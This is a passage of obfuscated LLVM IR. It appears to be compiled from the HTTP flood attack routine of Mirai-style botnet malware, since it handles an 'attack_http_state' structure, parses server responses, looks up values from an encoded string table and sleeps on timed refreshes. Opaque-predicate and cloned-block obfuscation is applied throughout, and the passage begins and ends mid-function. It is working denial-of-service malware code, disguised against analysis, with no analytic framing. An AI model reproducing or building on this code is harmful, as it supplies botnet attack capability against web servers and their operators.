  %2566 = or i1 %2564, %2565
  br i1 %2566, label %originalBB535, label %originalBB535alteredBB

originalBB535:                                    ; preds = %originalBB535alteredBB, %2558
  %2567 = load i32, i32* %18, align 4
  %2568 = add nsw i32 %2567, 1
  store i32 %2568, i32* %18, align 4
  %2569 = load i32, i32* @x.17
  %2570 = load i32, i32* @y.18
  %2571 = sub i32 %2569, 1
  %2572 = mul i32 %2569, %2571
  %2573 = urem i32 %2572, 2
  %2574 = icmp eq i32 %2573, 0
  %2575 = icmp slt i32 %2570, 10
  %2576 = or i1 %2574, %2575
  br i1 %2576, label %originalBBpart2544, label %originalBB535alteredBB

originalBBpart2544:                               ; preds = %originalBB535
  br label %2521

; <label>:2577:                                   ; preds = %2553, %2521
  %2578 = load i32, i32* @x.17
  %2579 = load i32, i32* @y.18
  %2580 = sub i32 %2578, 1
  %2581 = mul i32 %2578, %2580
  %2582 = urem i32 %2581, 2
  %2583 = icmp eq i32 %2582, 0
  %2584 = icmp slt i32 %2579, 10
  %2585 = or i1 %2583, %2584
  br i1 %2585, label %originalBB546, label %originalBB546alteredBB

originalBB546:                                    ; preds = %originalBB546alteredBB, %2577
  %2586 = load i8*, i8** %62, align 8
  %2587 = call i32 @util_strlen(i8* %2586)
  %2588 = icmp sgt i32 %2587, 0
  %2589 = load i32, i32* @x.17
  %2590 = load i32, i32* @y.18
  %2591 = sub i32 %2589, 1
  %2592 = mul i32 %2589, %2591
  %2593 = urem i32 %2592, 2
  %2594 = icmp eq i32 %2593, 0
  %2595 = icmp slt i32 %2590, 10
  %2596 = or i1 %2594, %2595
  br i1 %2596, label %originalBBpart2548, label %originalBB546alteredBB

originalBBpart2548:                               ; preds = %originalBB546
  br i1 %2588, label %2597, label %2607

; <label>:2597:                                   ; preds = %originalBBpart2548
  %2598 = load i8*, i8** %62, align 8
  %2599 = call i32 @util_strlen(i8* %2598)
  %2600 = icmp slt i32 %2599, 128
  br i1 %2600, label %2601, label %2607

; <label>:2601:                                   ; preds = %2597
  %2602 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2603 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2602, i32 0, i32 7
  %2604 = getelementptr inbounds [129 x i8], [129 x i8]* %2603, i32 0, i32 0
  %2605 = load i8*, i8** %62, align 8
  %2606 = call i32 @util_strcpy(i8* %2604, i8* %2605)
  br label %2607

; <label>:2607:                                   ; preds = %2601, %2597, %originalBBpart2548
  %2608 = load i8*, i8** %62, align 8
  %2609 = load i32, i32* %18, align 4
  %2610 = add nsw i32 %2609, 1
  %2611 = sext i32 %2610 to i64
  %2612 = getelementptr inbounds i8, i8* %2608, i64 %2611
  %2613 = call i32 @util_strlen(i8* %2612)
  %2614 = icmp slt i32 %2613, 256
  br i1 %2614, label %2615, label %2639

; <label>:2615:                                   ; preds = %2607
  %2616 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2616, i32 0, i32 6
  %2618 = getelementptr inbounds [257 x i8], [257 x i8]* %2617, i32 0, i32 0
  %2619 = getelementptr inbounds i8, i8* %2618, i64 1
  call void @util_zero(i8* %2619, i32 255)
  %2620 = load i8*, i8** %62, align 8
  %2621 = load i32, i32* %18, align 4
  %2622 = add nsw i32 %2621, 1
  %2623 = sext i32 %2622 to i64
  %2624 = getelementptr inbounds i8, i8* %2620, i64 %2623
  %2625 = call i32 @util_strlen(i8* %2624)
  %2626 = icmp sgt i32 %2625, 0
  br i1 %2626, label %2627, label %2638

; <label>:2627:                                   ; preds = %2615
  %2628 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2629 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2628, i32 0, i32 6
  %2630 = getelementptr inbounds [257 x i8], [257 x i8]* %2629, i32 0, i32 0
  %2631 = getelementptr inbounds i8, i8* %2630, i64 1
  %2632 = load i8*, i8** %62, align 8
  %2633 = load i32, i32* %18, align 4
  %2634 = add nsw i32 %2633, 1
  %2635 = sext i32 %2634 to i64
  %2636 = getelementptr inbounds i8, i8* %2632, i64 %2635
  %2637 = call i32 @util_strcpy(i8* %2631, i8* %2636)
  br label %2638

; <label>:2638:                                   ; preds = %2627, %2615
  br label %2639

; <label>:2639:                                   ; preds = %2638, %2607
  br label %2727

; <label>:2640:                                   ; preds = %2474
  %2641 = load i8*, i8** %62, align 8
  %2642 = getelementptr inbounds i8, i8* %2641, i64 0
  %2643 = load i8, i8* %2642, align 1
  %2644 = sext i8 %2643 to i32
  %2645 = icmp eq i32 %2644, 47
  br i1 %2645, label %2646, label %2726

; <label>:2646:                                   ; preds = %2640
  %2647 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2648 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2647, i32 0, i32 6
  %2649 = getelementptr inbounds [257 x i8], [257 x i8]* %2648, i32 0, i32 0
  %2650 = getelementptr inbounds i8, i8* %2649, i64 1
  call void @util_zero(i8* %2650, i32 255)
  %2651 = load i8*, i8** %62, align 8
  %2652 = load i32, i32* %18, align 4
  %2653 = add nsw i32 %2652, 1
  %2654 = sext i32 %2653 to i64
  %2655 = getelementptr inbounds i8, i8* %2651, i64 %2654
  %2656 = call i32 @util_strlen(i8* %2655)
  %2657 = icmp sgt i32 %2656, 0
  br i1 %2657, label %2658, label %2709

; <label>:2658:                                   ; preds = %2646
  %2659 = load i32, i32* @x.17
  %2660 = load i32, i32* @y.18
  %2661 = sub i32 %2659, 1
  %2662 = mul i32 %2659, %2661
  %2663 = urem i32 %2662, 2
  %2664 = icmp eq i32 %2663, 0
  %2665 = icmp slt i32 %2660, 10
  %2666 = or i1 %2664, %2665
  br i1 %2666, label %originalBB550, label %originalBB550alteredBB

originalBB550:                                    ; preds = %originalBB550alteredBB, %2658
  %2667 = load i8*, i8** %62, align 8
  %2668 = load i32, i32* %18, align 4
  %2669 = add nsw i32 %2668, 1
  %2670 = sext i32 %2669 to i64
  %2671 = getelementptr inbounds i8, i8* %2667, i64 %2670
  %2672 = call i32 @util_strlen(i8* %2671)
  %2673 = icmp slt i32 %2672, 256
  %2674 = load i32, i32* @x.17
  %2675 = load i32, i32* @y.18
  %2676 = sub i32 %2674, 1
  %2677 = mul i32 %2674, %2676
  %2678 = urem i32 %2677, 2
  %2679 = icmp eq i32 %2678, 0
  %2680 = icmp slt i32 %2675, 10
  %2681 = or i1 %2679, %2680
  br i1 %2681, label %originalBBpart2557, label %originalBB550alteredBB

originalBBpart2557:                               ; preds = %originalBB550
  br i1 %2673, label %2682, label %2709

; <label>:2682:                                   ; preds = %originalBBpart2557
  %2683 = load i32, i32* @x.17
  %2684 = load i32, i32* @y.18
  %2685 = sub i32 %2683, 1
  %2686 = mul i32 %2683, %2685
  %2687 = urem i32 %2686, 2
  %2688 = icmp eq i32 %2687, 0
  %2689 = icmp slt i32 %2684, 10
  %2690 = or i1 %2688, %2689
  br i1 %2690, label %originalBB559, label %originalBB559alteredBB

originalBB559:                                    ; preds = %originalBB559alteredBB, %2682
  %2691 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2692 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2691, i32 0, i32 6
  %2693 = getelementptr inbounds [257 x i8], [257 x i8]* %2692, i32 0, i32 0
  %2694 = getelementptr inbounds i8, i8* %2693, i64 1
  %2695 = load i8*, i8** %62, align 8
  %2696 = load i32, i32* %18, align 4
  %2697 = add nsw i32 %2696, 1
  %2698 = sext i32 %2697 to i64
  %2699 = getelementptr inbounds i8, i8* %2695, i64 %2698
  %2700 = call i32 @util_strcpy(i8* %2694, i8* %2699)
  %2701 = load i32, i32* @x.17
  %2702 = load i32, i32* @y.18
  %2703 = sub i32 %2701, 1
  %2704 = mul i32 %2701, %2703
  %2705 = urem i32 %2704, 2
  %2706 = icmp eq i32 %2705, 0
  %2707 = icmp slt i32 %2702, 10
  %2708 = or i1 %2706, %2707
  br i1 %2708, label %originalBBpart2573, label %originalBB559alteredBB

originalBBpart2573:                               ; preds = %originalBB559
  br label %2709

; <label>:2709:                                   ; preds = %originalBBpart2573, %originalBBpart2557, %2646
  %2710 = load i32, i32* @x.17
  %2711 = load i32, i32* @y.18
  %2712 = sub i32 %2710, 1
  %2713 = mul i32 %2710, %2712
  %2714 = urem i32 %2713, 2
  %2715 = icmp eq i32 %2714, 0
  %2716 = icmp slt i32 %2711, 10
  %2717 = or i1 %2715, %2716
  br i1 %2717, label %originalBB575, label %originalBB575alteredBB

originalBB575:                                    ; preds = %originalBB575alteredBB, %2709
  %2718 = load i32, i32* @x.17
  %2719 = load i32, i32* @y.18
  %2720 = sub i32 %2718, 1
  %2721 = mul i32 %2718, %2720
  %2722 = urem i32 %2721, 2
  %2723 = icmp eq i32 %2722, 0
  %2724 = icmp slt i32 %2719, 10
  %2725 = or i1 %2723, %2724
  br i1 %2725, label %originalBBpart2577, label %originalBB575alteredBB

originalBBpart2577:                               ; preds = %originalBB575
  br label %2726

; <label>:2726:                                   ; preds = %originalBBpart2577, %2640
  br label %2727

; <label>:2727:                                   ; preds = %2726, %2639
  %2728 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2729 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2728, i32 0, i32 1
  store i8 1, i8* %2729, align 4
  br label %4137

; <label>:2730:                                   ; preds = %2454
  br label %2731

; <label>:2731:                                   ; preds = %2730, %2418
  %2732 = load i32, i32* @x.17
  %2733 = load i32, i32* @y.18
  %2734 = sub i32 %2732, 1
  %2735 = mul i32 %2732, %2734
  %2736 = urem i32 %2735, 2
  %2737 = icmp eq i32 %2736, 0
  %2738 = icmp slt i32 %2733, 10
  %2739 = or i1 %2737, %2738
  br i1 %2739, label %originalBB579, label %originalBB579alteredBB

originalBB579:                                    ; preds = %originalBB579alteredBB, %2731
  %2740 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2741 = load i32, i32* %20, align 4
  %2742 = call i8* @table_retrieve_val(i32 44, i32* null)
  %2743 = call i32 @util_stristr(i8* %2740, i32 %2741, i8* %2742)
  %2744 = icmp ne i32 %2743, -1
  %2745 = load i32, i32* @x.17
  %2746 = load i32, i32* @y.18
  %2747 = sub i32 %2745, 1
  %2748 = mul i32 %2745, %2747
  %2749 = urem i32 %2748, 2
  %2750 = icmp eq i32 %2749, 0
  %2751 = icmp slt i32 %2746, 10
  %2752 = or i1 %2750, %2751
  br i1 %2752, label %originalBBpart2581, label %originalBB579alteredBB

originalBBpart2581:                               ; preds = %originalBB579
  br i1 %2744, label %2753, label %3339

; <label>:2753:                                   ; preds = %originalBBpart2581
  %2754 = load i32, i32* @x.17
  %2755 = load i32, i32* @y.18
  %2756 = sub i32 %2754, 1
  %2757 = mul i32 %2754, %2756
  %2758 = urem i32 %2757, 2
  %2759 = icmp eq i32 %2758, 0
  %2760 = icmp slt i32 %2755, 10
  %2761 = or i1 %2759, %2760
  br i1 %2761, label %originalBB583, label %originalBB583alteredBB

originalBB583:                                    ; preds = %originalBB583alteredBB, %2753
  %2762 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2763 = load i32, i32* %20, align 4
  %2764 = call i8* @table_retrieve_val(i32 44, i32* null)
  %2765 = call i32 @util_stristr(i8* %2762, i32 %2763, i8* %2764)
  store i32 %2765, i32* %63, align 4
  %2766 = load i32, i32* %63, align 4
  %2767 = sext i32 %2766 to i64
  %2768 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2767
  %2769 = load i8, i8* %2768, align 1
  %2770 = sext i8 %2769 to i32
  %2771 = icmp eq i32 %2770, 32
  %2772 = load i32, i32* @x.17
  %2773 = load i32, i32* @y.18
  %2774 = sub i32 %2772, 1
  %2775 = mul i32 %2772, %2774
  %2776 = urem i32 %2775, 2
  %2777 = icmp eq i32 %2776, 0
  %2778 = icmp slt i32 %2773, 10
  %2779 = or i1 %2777, %2778
  br i1 %2779, label %originalBBpart2585, label %originalBB583alteredBB

originalBBpart2585:                               ; preds = %originalBB583
  br i1 %2771, label %2780, label %2783

; <label>:2780:                                   ; preds = %originalBBpart2585
  %2781 = load i32, i32* %63, align 4
  %2782 = add nsw i32 %2781, 1
  store i32 %2782, i32* %63, align 4
  br label %2783

; <label>:2783:                                   ; preds = %2780, %originalBBpart2585
  %2784 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2785 = load i32, i32* %63, align 4
  %2786 = sext i32 %2785 to i64
  %2787 = getelementptr inbounds i8, i8* %2784, i64 %2786
  %2788 = load i32, i32* %20, align 4
  %2789 = load i32, i32* %63, align 4
  %2790 = sub nsw i32 %2788, %2789
  %2791 = call i32 @util_memsearch(i8* %2787, i32 %2790, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2791, i32* %64, align 4
  %2792 = load i32, i32* %64, align 4
  %2793 = icmp ne i32 %2792, -1
  br i1 %2793, label %2794, label %3322

; <label>:2794:                                   ; preds = %2783
  %2795 = load i32, i32* %63, align 4
  %2796 = sext i32 %2795 to i64
  %2797 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2796
  store i8* %2797, i8** %65, align 8
  %2798 = load i32, i32* %64, align 4
  %2799 = icmp sge i32 %2798, 2
  br i1 %2799, label %2800, label %2803

; <label>:2800:                                   ; preds = %2794
  %2801 = load i32, i32* %64, align 4
  %2802 = sub nsw i32 %2801, 2
  store i32 %2802, i32* %64, align 4
  br label %2803

; <label>:2803:                                   ; preds = %2800, %2794
  %2804 = load i32, i32* @x.17
  %2805 = load i32, i32* @y.18
  %2806 = sub i32 %2804, 1
  %2807 = mul i32 %2804, %2806
  %2808 = urem i32 %2807, 2
  %2809 = icmp eq i32 %2808, 0
  %2810 = icmp slt i32 %2805, 10
  %2811 = or i1 %2809, %2810
  br i1 %2811, label %originalBB587, label %originalBB587alteredBB

originalBB587:                                    ; preds = %originalBB587alteredBB, %2803
  %2812 = load i32, i32* %63, align 4
  %2813 = load i32, i32* %64, align 4
  %2814 = add nsw i32 %2812, %2813
  %2815 = sext i32 %2814 to i64
  %2816 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2815
  store i8 0, i8* %2816, align 1
  %2817 = load i32, i32* %64, align 4
  %2818 = add nsw i32 %2817, 1
  store i32 %2818, i32* %64, align 4
  store i32 0, i32* %18, align 4
  %2819 = load i32, i32* @x.17
  %2820 = load i32, i32* @y.18
  %2821 = sub i32 %2819, 1
  %2822 = mul i32 %2819, %2821
  %2823 = urem i32 %2822, 2
  %2824 = icmp eq i32 %2823, 0
  %2825 = icmp slt i32 %2820, 10
  %2826 = or i1 %2824, %2825
  br i1 %2826, label %originalBBpart2601, label %originalBB587alteredBB

originalBBpart2601:                               ; preds = %originalBB587
  br label %2827

; <label>:2827:                                   ; preds = %2885, %originalBBpart2601
  %2828 = load i32, i32* @x.17
  %2829 = load i32, i32* @y.18
  %2830 = sub i32 %2828, 1
  %2831 = mul i32 %2828, %2830
  %2832 = urem i32 %2831, 2
  %2833 = icmp eq i32 %2832, 0
  %2834 = icmp slt i32 %2829, 10
  %2835 = or i1 %2833, %2834
  br i1 %2835, label %originalBB603, label %originalBB603alteredBB

originalBB603:                                    ; preds = %originalBB603alteredBB, %2827
  %2836 = load i8*, i8** %65, align 8
  %2837 = load i32, i32* %18, align 4
  %2838 = sext i32 %2837 to i64
  %2839 = getelementptr inbounds i8, i8* %2836, i64 %2838
  %2840 = load i8, i8* %2839, align 1
  %2841 = sext i8 %2840 to i32
  %2842 = icmp ne i32 %2841, 0
  %2843 = load i32, i32* @x.17
  %2844 = load i32, i32* @y.18
  %2845 = sub i32 %2843, 1
  %2846 = mul i32 %2843, %2845
  %2847 = urem i32 %2846, 2
  %2848 = icmp eq i32 %2847, 0
  %2849 = icmp slt i32 %2844, 10
  %2850 = or i1 %2848, %2849
  br i1 %2850, label %originalBBpart2605, label %originalBB603alteredBB

originalBBpart2605:                               ; preds = %originalBB603
  br i1 %2842, label %2851, label %2867

; <label>:2851:                                   ; preds = %originalBBpart2605
  %2852 = load i8*, i8** %65, align 8
  %2853 = load i32, i32* %18, align 4
  %2854 = sext i32 %2853 to i64
  %2855 = getelementptr inbounds i8, i8* %2852, i64 %2854
  %2856 = load i8, i8* %2855, align 1
  %2857 = sext i8 %2856 to i32
  %2858 = icmp sge i32 %2857, 48
  br i1 %2858, label %2859, label %2867

; <label>:2859:                                   ; preds = %2851
  %2860 = load i8*, i8** %65, align 8
  %2861 = load i32, i32* %18, align 4
  %2862 = sext i32 %2861 to i64
  %2863 = getelementptr inbounds i8, i8* %2860, i64 %2862
  %2864 = load i8, i8* %2863, align 1
  %2865 = sext i8 %2864 to i32
  %2866 = icmp sle i32 %2865, 57
  br label %2867

; <label>:2867:                                   ; preds = %2859, %2851, %originalBBpart2605
  %2868 = phi i1 [ false, %2851 ], [ false, %originalBBpart2605 ], [ %2866, %2859 ]
  %2869 = load i32, i32* @x.17
  %2870 = load i32, i32* @y.18
  %2871 = sub i32 %2869, 1
  %2872 = mul i32 %2869, %2871
  %2873 = urem i32 %2872, 2
  %2874 = icmp eq i32 %2873, 0
  %2875 = icmp slt i32 %2870, 10
  %2876 = or i1 %2874, %2875
  br i1 %2876, label %originalBB607, label %originalBB607alteredBB

originalBB607:                                    ; preds = %originalBB607alteredBB, %2867
  %2877 = load i32, i32* @x.17
  %2878 = load i32, i32* @y.18
  %2879 = sub i32 %2877, 1
  %2880 = mul i32 %2877, %2879
  %2881 = urem i32 %2880, 2
  %2882 = icmp eq i32 %2881, 0
  %2883 = icmp slt i32 %2878, 10
  %2884 = or i1 %2882, %2883
  br i1 %2884, label %originalBBpart2609, label %originalBB607alteredBB

originalBBpart2609:                               ; preds = %originalBB607
  br i1 %2868, label %2885, label %2888

; <label>:2885:                                   ; preds = %originalBBpart2609
  %2886 = load i32, i32* %18, align 4
  %2887 = add nsw i32 %2886, 1
  store i32 %2887, i32* %18, align 4
  br label %2827

; <label>:2888:                                   ; preds = %originalBBpart2609
  %2889 = load i32, i32* @x.17
  %2890 = load i32, i32* @y.18
  %2891 = sub i32 %2889, 1
  %2892 = mul i32 %2889, %2891
  %2893 = urem i32 %2892, 2
  %2894 = icmp eq i32 %2893, 0
  %2895 = icmp slt i32 %2890, 10
  %2896 = or i1 %2894, %2895
  br i1 %2896, label %originalBB611, label %originalBB611alteredBB

originalBB611:                                    ; preds = %originalBB611alteredBB, %2888
  %2897 = load i8*, i8** %65, align 8
  %2898 = load i32, i32* %18, align 4
  %2899 = sext i32 %2898 to i64
  %2900 = getelementptr inbounds i8, i8* %2897, i64 %2899
  %2901 = load i8, i8* %2900, align 1
  %2902 = sext i8 %2901 to i32
  %2903 = icmp ne i32 %2902, 0
  %2904 = load i32, i32* @x.17
  %2905 = load i32, i32* @y.18
  %2906 = sub i32 %2904, 1
  %2907 = mul i32 %2904, %2906
  %2908 = urem i32 %2907, 2
  %2909 = icmp eq i32 %2908, 0
  %2910 = icmp slt i32 %2905, 10
  %2911 = or i1 %2909, %2910
  br i1 %2911, label %originalBBpart2613, label %originalBB611alteredBB

originalBBpart2613:                               ; preds = %originalBB611
  br i1 %2903, label %2912, label %3321

; <label>:2912:                                   ; preds = %originalBBpart2613
  %2913 = load i32, i32* @x.17
  %2914 = load i32, i32* @y.18
  %2915 = sub i32 %2913, 1
  %2916 = mul i32 %2913, %2915
  %2917 = urem i32 %2916, 2
  %2918 = icmp eq i32 %2917, 0
  %2919 = icmp slt i32 %2914, 10
  %2920 = or i1 %2918, %2919
  br i1 %2920, label %originalBB615, label %originalBB615alteredBB

originalBB615:                                    ; preds = %originalBB615alteredBB, %2912
  store i32 0, i32* %66, align 4
  %2921 = load i8*, i8** %65, align 8
  %2922 = load i32, i32* %18, align 4
  %2923 = sext i32 %2922 to i64
  %2924 = getelementptr inbounds i8, i8* %2921, i64 %2923
  store i8 0, i8* %2924, align 1
  %2925 = load i32, i32* %18, align 4
  %2926 = add nsw i32 %2925, 1
  store i32 %2926, i32* %18, align 4
  %2927 = load i8*, i8** %65, align 8
  %2928 = load i32, i32* %18, align 4
  %2929 = sext i32 %2928 to i64
  %2930 = getelementptr inbounds i8, i8* %2927, i64 %2929
  %2931 = load i8, i8* %2930, align 1
  %2932 = sext i8 %2931 to i32
  %2933 = icmp eq i32 %2932, 32
  %2934 = load i32, i32* @x.17
  %2935 = load i32, i32* @y.18
  %2936 = sub i32 %2934, 1
  %2937 = mul i32 %2934, %2936
  %2938 = urem i32 %2937, 2
  %2939 = icmp eq i32 %2938, 0
  %2940 = icmp slt i32 %2935, 10
  %2941 = or i1 %2939, %2940
  br i1 %2941, label %originalBBpart2617, label %originalBB615alteredBB

originalBBpart2617:                               ; preds = %originalBB615
  br i1 %2933, label %2942, label %2945

; <label>:2942:                                   ; preds = %originalBBpart2617
  %2943 = load i32, i32* %18, align 4
  %2944 = add nsw i32 %2943, 1
  store i32 %2944, i32* %18, align 4
  br label %2945

; <label>:2945:                                   ; preds = %2942, %originalBBpart2617
  %2946 = load i8*, i8** %65, align 8
  %2947 = load i32, i32* %18, align 4
  %2948 = sext i32 %2947 to i64
  %2949 = getelementptr inbounds i8, i8* %2946, i64 %2948
  %2950 = load i8*, i8** %65, align 8
  %2951 = load i32, i32* %18, align 4
  %2952 = sext i32 %2951 to i64
  %2953 = getelementptr inbounds i8, i8* %2950, i64 %2952
  %2954 = call i32 @util_strlen(i8* %2953)
  %2955 = call i32 @util_stristr(i8* %2949, i32 %2954, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2956 = icmp ne i32 %2955, -1
  br i1 %2956, label %2957, label %2986

; <label>:2957:                                   ; preds = %2945
  %2958 = load i32, i32* @x.17
  %2959 = load i32, i32* @y.18
  %2960 = sub i32 %2958, 1
  %2961 = mul i32 %2958, %2960
  %2962 = urem i32 %2961, 2
  %2963 = icmp eq i32 %2962, 0
  %2964 = icmp slt i32 %2959, 10
  %2965 = or i1 %2963, %2964
  br i1 %2965, label %originalBB619, label %originalBB619alteredBB

originalBB619:                                    ; preds = %originalBB619alteredBB, %2957
  %2966 = load i8*, i8** %65, align 8
  %2967 = load i32, i32* %18, align 4
  %2968 = sext i32 %2967 to i64
  %2969 = getelementptr inbounds i8, i8* %2966, i64 %2968
  %2970 = load i8*, i8** %65, align 8
  %2971 = load i32, i32* %18, align 4
  %2972 = sext i32 %2971 to i64
  %2973 = getelementptr inbounds i8, i8* %2970, i64 %2972
  %2974 = call i32 @util_strlen(i8* %2973)
  %2975 = call i32 @util_stristr(i8* %2969, i32 %2974, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2976 = load i32, i32* %18, align 4
  %2977 = add nsw i32 %2976, %2975
  store i32 %2977, i32* %18, align 4
  %2978 = load i32, i32* @x.17
  %2979 = load i32, i32* @y.18
  %2980 = sub i32 %2978, 1
  %2981 = mul i32 %2978, %2980
  %2982 = urem i32 %2981, 2
  %2983 = icmp eq i32 %2982, 0
  %2984 = icmp slt i32 %2979, 10
  %2985 = or i1 %2983, %2984
  br i1 %2985, label %originalBBpart2623, label %originalBB619alteredBB

originalBBpart2623:                               ; preds = %originalBB619
  br label %2986

; <label>:2986:                                   ; preds = %originalBBpart2623, %2945
  %2987 = load i32, i32* @x.17
  %2988 = load i32, i32* @y.18
  %2989 = sub i32 %2987, 1
  %2990 = mul i32 %2987, %2989
  %2991 = urem i32 %2990, 2
  %2992 = icmp eq i32 %2991, 0
  %2993 = icmp slt i32 %2988, 10
  %2994 = or i1 %2992, %2993
  br i1 %2994, label %originalBB625, label %originalBB625alteredBB

originalBB625:                                    ; preds = %originalBB625alteredBB, %2986
  %2995 = load i8*, i8** %65, align 8
  %2996 = load i32, i32* %18, align 4
  %2997 = sext i32 %2996 to i64
  %2998 = getelementptr inbounds i8, i8* %2995, i64 %2997
  %2999 = load i8, i8* %2998, align 1
  %3000 = sext i8 %2999 to i32
  %3001 = icmp eq i32 %3000, 34
  %3002 = load i32, i32* @x.17
  %3003 = load i32, i32* @y.18
  %3004 = sub i32 %3002, 1
  %3005 = mul i32 %3002, %3004
  %3006 = urem i32 %3005, 2
  %3007 = icmp eq i32 %3006, 0
  %3008 = icmp slt i32 %3003, 10
  %3009 = or i1 %3007, %3008
  br i1 %3009, label %originalBBpart2627, label %originalBB625alteredBB

originalBBpart2627:                               ; preds = %originalBB625
  br i1 %3001, label %3010, label %3058

; <label>:3010:                                   ; preds = %originalBBpart2627
  %3011 = load i32, i32* %18, align 4
  %3012 = add nsw i32 %3011, 1
  store i32 %3012, i32* %18, align 4
  %3013 = load i8*, i8** %65, align 8
  %3014 = load i32, i32* %18, align 4
  %3015 = sext i32 %3014 to i64
  %3016 = getelementptr inbounds i8, i8* %3013, i64 %3015
  %3017 = load i8*, i8** %65, align 8
  %3018 = load i32, i32* %18, align 4
  %3019 = sext i32 %3018 to i64
  %3020 = getelementptr inbounds i8, i8* %3017, i64 %3019
  %3021 = call i32 @util_strlen(i8* %3020)
  %3022 = sub nsw i32 %3021, 1
  %3023 = sext i32 %3022 to i64
  %3024 = getelementptr inbounds i8, i8* %3016, i64 %3023
  %3025 = load i8, i8* %3024, align 1
  %3026 = sext i8 %3025 to i32
  %3027 = icmp eq i32 %3026, 34
  br i1 %3027, label %3028, label %3041

; <label>:3028:                                   ; preds = %3010
  %3029 = load i8*, i8** %65, align 8
  %3030 = load i32, i32* %18, align 4
  %3031 = sext i32 %3030 to i64
  %3032 = getelementptr inbounds i8, i8* %3029, i64 %3031
  %3033 = load i8*, i8** %65, align 8
  %3034 = load i32, i32* %18, align 4
  %3035 = sext i32 %3034 to i64
  %3036 = getelementptr inbounds i8, i8* %3033, i64 %3035
  %3037 = call i32 @util_strlen(i8* %3036)
  %3038 = sub nsw i32 %3037, 1
  %3039 = sext i32 %3038 to i64
  %3040 = getelementptr inbounds i8, i8* %3032, i64 %3039
  store i8 0, i8* %3040, align 1
  br label %3041

; <label>:3041:                                   ; preds = %3028, %3010
  %3042 = load i32, i32* @x.17
  %3043 = load i32, i32* @y.18
  %3044 = sub i32 %3042, 1
  %3045 = mul i32 %3042, %3044
  %3046 = urem i32 %3045, 2
  %3047 = icmp eq i32 %3046, 0
  %3048 = icmp slt i32 %3043, 10
  %3049 = or i1 %3047, %3048
  br i1 %3049, label %originalBB629, label %originalBB629alteredBB

originalBB629:                                    ; preds = %originalBB629alteredBB, %3041
  %3050 = load i32, i32* @x.17
  %3051 = load i32, i32* @y.18
  %3052 = sub i32 %3050, 1
  %3053 = mul i32 %3050, %3052
  %3054 = urem i32 %3053, 2
  %3055 = icmp eq i32 %3054, 0
  %3056 = icmp slt i32 %3051, 10
  %3057 = or i1 %3055, %3056
  br i1 %3057, label %originalBBpart2631, label %originalBB629alteredBB

originalBBpart2631:                               ; preds = %originalBB629
  br label %3058

; <label>:3058:                                   ; preds = %originalBBpart2631, %originalBBpart2627
  %3059 = load i32, i32* @x.17
  %3060 = load i32, i32* @y.18
  %3061 = sub i32 %3059, 1
  %3062 = mul i32 %3059, %3061
  %3063 = urem i32 %3062, 2
  %3064 = icmp eq i32 %3063, 0
  %3065 = icmp slt i32 %3060, 10
  %3066 = or i1 %3064, %3065
  br i1 %3066, label %originalBB633, label %originalBB633alteredBB

originalBB633:                                    ; preds = %originalBB633alteredBB, %3058
  %3067 = load i8*, i8** %65, align 8
  %3068 = call i32 @util_atoi(i8* %3067, i32 10)
  store i32 %3068, i32* %66, align 4
  %3069 = load i32, i32* @x.17
  %3070 = load i32, i32* @y.18
  %3071 = sub i32 %3069, 1
  %3072 = mul i32 %3069, %3071
  %3073 = urem i32 %3072, 2
  %3074 = icmp eq i32 %3073, 0
  %3075 = icmp slt i32 %3070, 10
  %3076 = or i1 %3074, %3075
  br i1 %3076, label %originalBBpart2635, label %originalBB633alteredBB

originalBBpart2635:                               ; preds = %originalBB633
  br label %3077

; <label>:3077:                                   ; preds = %originalBBpart2639, %originalBBpart2635
  %3078 = load i32, i32* %66, align 4
  %3079 = icmp sgt i32 %3078, 0
  br i1 %3079, label %3080, label %3090

; <label>:3080:                                   ; preds = %3077
  %3081 = load i32, i32* %66, align 4
  %3082 = icmp slt i32 %3081, 10
  br i1 %3082, label %3083, label %3090

; <label>:3083:                                   ; preds = %3080
  %3084 = load i32, i32* %35, align 4
  %3085 = load i32, i32* %66, align 4
  %3086 = add i32 %3084, %3085
  %3087 = zext i32 %3086 to i64
  %3088 = call i64 @time(i64* null) #6
  %3089 = icmp sgt i64 %3087, %3088
  br label %3090

; <label>:3090:                                   ; preds = %3083, %3080, %3077
  %3091 = phi i1 [ false, %3080 ], [ false, %3077 ], [ %3089, %3083 ]
  br i1 %3091, label %3092, label %3110

; <label>:3092:                                   ; preds = %3090
  %3093 = load i32, i32* @x.17
  %3094 = load i32, i32* @y.18
  %3095 = sub i32 %3093, 1
  %3096 = mul i32 %3093, %3095
  %3097 = urem i32 %3096, 2
  %3098 = icmp eq i32 %3097, 0
  %3099 = icmp slt i32 %3094, 10
  %3100 = or i1 %3098, %3099
  br i1 %3100, label %originalBB637, label %originalBB637alteredBB

originalBB637:                                    ; preds = %originalBB637alteredBB, %3092
  %3101 = call i32 @sleep(i32 1)
  %3102 = load i32, i32* @x.17
  %3103 = load i32, i32* @y.18
  %3104 = sub i32 %3102, 1
  %3105 = mul i32 %3102, %3104
  %3106 = urem i32 %3105, 2
  %3107 = icmp eq i32 %3106, 0
  %3108 = icmp slt i32 %3103, 10
